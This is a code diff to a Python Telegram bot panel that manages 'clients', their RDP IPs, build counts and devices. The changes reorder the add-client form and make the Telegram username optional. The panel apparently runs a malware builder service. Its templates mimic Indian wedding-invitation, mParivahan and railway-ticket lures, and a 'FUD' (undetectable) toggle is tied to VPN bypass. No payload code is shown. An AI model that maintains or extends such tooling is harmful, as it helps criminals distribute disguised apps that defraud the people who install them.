@@ -134,11 +134,11 @@ _current_tunnel_url = ""
 # ── Canonical templates (keep in sync with scripts/package_name_generator.py + build.yml) ──
 # wedding | shaadi | shaadi_hindi | mparivahan | railway | friends | bhabhi | custom
 TEMPLATES = {
+    "railway":      ("🚂", "Indian Railway Ticket"),
+    "mparivahan":   ("🚗", "mParivahan"),
     "wedding":      ("💍", "Wedding Invitation"),
     "shaadi":       ("💒", "Shaadi Ka Nimantran"),
     "shaadi_hindi": ("🙏", "शादी का निमंत्रण"),
-    "mparivahan":   ("🚗", "mParivahan"),
-    "railway":      ("🚂", "Indian Railway Ticket"),
     "friends":      ("👫", "Friends Club"),
     "bhabhi":       ("💃", "Fun with Bhabhi"),
     "custom":       ("⚙️",  "Custom"),
@@ -1540,14 +1540,19 @@ def text_client_detail(c: dict) -> str:
         st       = "✅" if last_build["status"] == "success" else "❌"
         last     = f"#{last_build['build_number']} {st} {emoji}"
 
-    fud_label = "🟢 ON" if c.get("vpn_bypass", 1) else "🔴 OFF"
+    fud_label    = "🟢 ON" if c.get("vpn_bypass", 1) else "🔴 OFF"
+    username_line = f"@{c['telegram_username']}" if c['telegram_username'] else "—"
+    profile_line  = c['profile_name'] if c['profile_name'] else "—"
     return (
         f"👤 <b>{name}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        f"Username    : @{c['telegram_username']}\n"
+        f"Status      : {'🟢 Active' if c['active'] else '🔴 Inactive'}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"Profile     : {profile_line}\n"
+        f"Username    : {username_line}\n"
         f"Telegram ID : <code>{c['telegram_id']}</code>\n"
         f"RDP IP      : <code>{c['rdp_ip']}</code>\n"
-        f"Status      : {'🟢 Active' if c['active'] else '🔴 Inactive'}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
         f"FUD         : {fud_label}\n"
         f"Builds      : {builds}\n"
         f"Devices     : {devices}\n"
@@ -2429,21 +2434,21 @@ def text_settings(chat_id: int) -> str:
 def text_add_client_form(data: dict, current_field: str,
                          error: str = "") -> str:
     # Step counter
-    step_map = {"username": 1, "name": 2, "tg_id": 3, "rdp_ip": 4}
+    step_map = {"name": 1, "tg_id": 2, "rdp_ip": 3, "username": 4}
     step = step_map.get(current_field, 1)
     total = 4
 
     fields = [
-        ("username", "Telegram Username",    data.get("username", ""), True),
-        ("name",     "Profile Name",         data.get("name", "") or "—", False),
-        ("tg_id",    "Telegram ID",          data.get("tg_id", ""),   True),
-        ("rdp_ip",   "RDP IP Address",       data.get("rdp_ip", ""),  True),
+        ("name",     "Profile Name",         data.get("name", "") or "—", True),
+        ("tg_id",    "Telegram ID",          data.get("tg_id", ""),        True),
+        ("rdp_ip",   "RDP IP Address",       data.get("rdp_ip", ""),       True),
+        ("username", "Telegram Username",    data.get("username", ""),     False),
     ]
     prompts = {
-        "username": "✏️ Send Telegram username (without @):",
-        "name":     "✏️ Send profile name, or send  .  to skip:",
+        "name":     "✏️ Send profile name (e.g. Txmod):",
         "tg_id":    "✏️ Send Telegram ID (numbers only):",
         "rdp_ip":   "✏️ Send RDP IP address (e.g. 192.168.1.1):",
+        "username": "✏️ Send Telegram username (without @), or send  .  to skip:",
     }
 
     lines = [
@@ -4075,26 +4080,12 @@ def handle_add_client_input(message):
     data   = buf.get("data", {})
     error  = ""
 
-    if field == "username":
-        clean = text.lstrip("@").strip()
-        if not clean:
-            error = "Username cannot be empty."
+    if field == "name":
+        if not text.strip():
+            error = "Profile name cannot be empty."
         else:
-            # Duplicate check
-            db = get_db()
-            existing = db.execute(
-                "SELECT id FROM clients WHERE telegram_username=?",
-                (clean,)).fetchone()
-            db.close()
-            if existing:
-                error = f"Client @{clean} already exists."
-            else:
-                data["username"] = clean
-                buf["field"]     = "name"
-
-    elif field == "name":
-        data["name"]  = "" if text == "." else text.strip()
-        buf["field"]  = "tg_id"
+            data["name"] = text.strip()
+            buf["field"] = "tg_id"
 
     elif field == "tg_id":
         if not text.strip().lstrip("-").isdigit():
@@ -4110,7 +4101,27 @@ def handle_add_client_input(message):
             error = "Invalid IP format. Example: 192.168.1.100"
         else:
             data["rdp_ip"] = text.strip()
-            buf["field"]   = "confirm"
+            buf["field"]   = "username"
+
+    elif field == "username":
+        clean = text.lstrip("@").strip()
+        if text.strip() == ".":
+            data["username"] = ""
+            buf["field"]     = "confirm"
+        elif not clean:
+            error = "Send a username or send  .  to skip."
+        else:
+            # Duplicate check
+            db = get_db()
+            existing = db.execute(
+                "SELECT id FROM clients WHERE telegram_username=?",
+                (clean,)).fetchone()
+            db.close()
+            if existing:
+                error = f"Client @{clean} already exists."
+            else:
+                data["username"] = clean
+                buf["field"]     = "confirm"
 
     buf["data"]              = data
     add_client_buf[chat_id]  = buf
@@ -4355,11 +4366,11 @@ def handle_callback(call):
         safe_edit(chat_id, msg_id, text_prod_menu(), kb_build())
 
     elif data == "add_client":
-        add_client_buf[str(chat_id)] = {"field": "username", "data": {}}
+        add_client_buf[str(chat_id)] = {"field": "name", "data": {}}
         nav_state[str(chat_id)] = {"screen": "add_client",
                                    "message_id": msg_id}
         safe_edit(chat_id, msg_id,
-                  text_add_client_form({}, "username"),
+                  text_add_client_form({}, "name"),
                   kb_add_client_cancel())
 
     elif data.startswith("client_") and not data.startswith("client_stats_"):
